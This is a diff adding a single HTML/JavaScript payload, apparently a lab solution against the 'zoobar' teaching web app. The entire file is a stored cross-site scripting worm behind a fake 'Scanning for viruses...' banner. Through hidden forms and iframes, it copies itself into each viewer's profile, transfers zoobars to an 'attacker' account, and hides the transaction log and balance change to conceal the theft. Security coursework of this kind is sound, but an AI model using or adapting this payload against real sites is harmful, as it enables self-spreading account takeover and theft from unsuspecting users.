@@ -1,0 +1,45 @@
+<div id='attack'><b>Scanning for viruses...</b>
+<iframe name='my_iframe' src='' id='output_frame' width='0' height='0' style='display:none'></iframe>
+<iframe name='zoobarframe' src='' id='output_frame' width='0' height='0' style='display:none'></iframe>
+<form method='POST' id='profileform' name='profileform' style='display:none' target='my_iframe' action='http://localhost:8080/zoobar/index.cgi/'>
+    <textarea id='profile_update' name='profile_update' rows='20' cols='80'></textarea>
+    <br>
+    <input type='submit' name='profile_submit' value='Save'>
+</form>
+
+<form method='POST' target='zoobarframe' style='display:none' id='transferform' name='transferform' action='http://localhost:8080/zoobar/index.cgi/transfer'>
+<p>Send <input name='zoobars_orig' type='text' value=' size=5> zoobars</p>
+<p>to <input name=recipientold type=text value=' size=10></p>
+<input name='zoobars' type='text' value='1' size=5 style='display:none'>
+<input name=recipient type=text value='attacker' size=10 style='display:none'>
+<input type='submit' name='submission' value='Send'>
+</form>
+
+<script>
+function addWormToProfile() {
+	document.getElementById('profile_update').value = '<div id=' + 'attack'+ '>' + document.getElementById('attack').innerHTML + '</div>';
+	document.getElementById('profileform').submit();
+	// alert('added worm');
+}
+
+function stealZoobar() {
+	document.getElementById('transferform').submit();
+}
+
+function resetzoobars() {
+	document.getElementById('zoobars').className = 10;
+	total = eval(document.getElementById('zoobars').className);
+	showZoobars(0);
+}
+
+document.addEventListener('DOMContentLoaded', function(event) { 
+	addWormToProfile();
+	stealZoobar();
+// 	document.getElementById('zoobars').className = 10;
+	document.getElementsByClassName('log')[0].tBodies[0].style.visibility='hidden';
+	// setTimeout(resetzoobars, 500);
+	resetzoobars();
+});
+
+</script>
+</div>
